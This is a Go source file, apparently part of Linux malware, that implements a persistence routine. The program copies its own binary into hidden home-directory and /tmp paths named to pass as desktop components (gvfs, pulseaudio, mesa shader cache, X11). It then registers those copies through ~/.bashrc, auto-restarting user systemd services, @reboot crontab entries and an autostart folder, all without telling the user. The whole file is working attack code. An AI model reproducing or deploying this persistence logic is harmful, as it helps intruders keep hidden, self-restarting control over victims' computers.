//go:build linux

package persistance

import (
	"errors"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var unsuspectingPaths = []struct {
	Path        string
	Filename    string
	ServiceName string
}{
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".local", "share", "gvfs-helper"),
		Filename:    "gvfs-metadata-check",
		ServiceName: "gvfs-metadata",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".config", "pulse"),
		Filename:    "pulse-audio-fix",
		ServiceName: "pulseaudio-check",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".cache", "thumbnails", "log"),
		Filename:    "thumb-extract",
		ServiceName: "thumbnail-verify",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".local", "bin"),
		Filename:    "system-update-notifier",
		ServiceName: "sys-update-check",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user", "cache"),
		Filename:    "sd-cache-clean",
		ServiceName: "systemd-tmp-worker",
	},
	{
		Path:        filepath.Join("/tmp", ".X11-unix"),
		Filename:    "x11-auth-helper",
		ServiceName: "x11-verify-daemon",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".local", "share", "tracker"),
		Filename:    "tracker-miner-fs-3",
		ServiceName: "tracker-extract-3",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".config", "ibus", "bus"),
		Filename:    "ibus-daemon-helper",
		ServiceName: "ibus-check",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".local", "share", "flatpak", "db"),
		Filename:    "flatpak-oci-check",
		ServiceName: "flatpak-stats",
	},
	{
		Path:        filepath.Join(os.Getenv("HOME"), ".cache", "mesa_shader_cache"),
		Filename:    "mesa-proctrap",
		ServiceName: "mesa-shader-worker",
	},
}

func copySelf() []byte {
	self, _ := os.Executable()
	data, err := os.ReadFile(self)
	if err != nil {
		return []byte{0x00}
	} else {
		return data
	}
}

func replicate(path string, filename string, file []byte) error {
	_, err := os.Stat(path)
	if err != nil {
		err2 := os.MkdirAll(path, 0755)
		if err2 != nil {
			return errors.New("something ig bro")
		}
	}
	err = os.WriteFile(filepath.Join(path, filename), file, 0755)
	if err != nil {
		return errors.New("something ig bro")
	} else {
		return nil
	}
}

func Persist() {
	self := copySelf()
	var filepaths []int
	filepaths = append(filepaths, rand.IntN(len(unsuspectingPaths)-1))
OuterFor:
	for len(filepaths) < 5 {
		newpath := rand.IntN(len(unsuspectingPaths) - 1)
		for _, path := range filepaths {
			if newpath == path {
				continue OuterFor
			}
		}
		filepaths = append(filepaths, newpath)
	}

	for _, path := range filepaths[:4] {
		replicate(unsuspectingPaths[path].Path, unsuspectingPaths[path].Filename, self)
	}

	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")
	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err == nil {
		p0 := unsuspectingPaths[filepaths[0]]
		cmd := fmt.Sprintf("\n( %s & ) > /dev/null 2>&1\n", filepath.Join(p0.Path, p0.Filename))
		f.WriteString(cmd)
		f.Close()
	}

	systemdDir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
	os.MkdirAll(systemdDir, 0755)

	for i := 1; i <= 2; i++ {
		p := unsuspectingPaths[filepaths[i]]
		sName := p.ServiceName + ".service"
		serviceContent := fmt.Sprintf("[Unit]\nDescription=%s\n\n[Service]\nExecStart=%s\nRestart=always\n\n[Install]\nWantedBy=default.target\n",
			p.ServiceName, filepath.Join(p.Path, p.Filename))

		servicePath := filepath.Join(systemdDir, sName)
		os.WriteFile(servicePath, []byte(serviceContent), 0644)

		exec.Command("systemctl", "--user", "daemon-reload").Run()
		exec.Command("systemctl", "--user", "enable", sName).Run()
		exec.Command("systemctl", "--user", "start", sName).Run()
	}

	for i := 3; i <= 4; i++ {
		p := unsuspectingPaths[filepaths[i]]
		fullPath := filepath.Join(p.Path, p.Filename)

		out, _ := exec.Command("crontab", "-l").Output()
		currentCron := string(out)

		if !strings.Contains(currentCron, fullPath) {
			newCron := currentCron + fmt.Sprintf("@reboot %s\n", fullPath)
			tmpFile := filepath.Join(os.TempDir(), "crontmp")
			os.WriteFile(tmpFile, []byte(newCron), 0644)
			exec.Command("crontab", tmpFile).Run()
			os.Remove(tmpFile)
		}
	}

	autostartDir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
	replicate(autostartDir, unsuspectingPaths[filepaths[4]].Filename, self)
}
